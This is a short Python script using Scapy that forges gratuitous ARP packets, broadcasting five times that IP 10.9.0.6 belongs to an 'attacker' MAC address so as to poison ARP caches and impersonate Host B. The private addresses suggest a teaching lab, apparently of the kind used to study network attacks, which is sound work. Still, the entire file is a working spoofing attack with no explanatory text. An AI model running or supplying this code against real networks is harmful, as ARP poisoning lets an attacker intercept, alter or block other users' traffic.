#!/usr/bin/env python3
from scapy.all import *

# We're claiming to be Host B
spoofed_ip = "10.9.0.6"
attacker_mac = "02:42:0a:09:00:69"

# Construct gratuitous ARP packet
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
         ARP(op=1,  # 1 = ARP request
             hwsrc=attacker_mac,
             psrc=spoofed_ip,
             pdst=spoofed_ip)  # Same as psrc for gratuitous

# Send multiple packets as this is less reliable
for i in range(5):
    sendp(packet)
    time.sleep(0.2)

print(f"Sent gratuitous ARP: {spoofed_ip} is at {attacker_mac}")
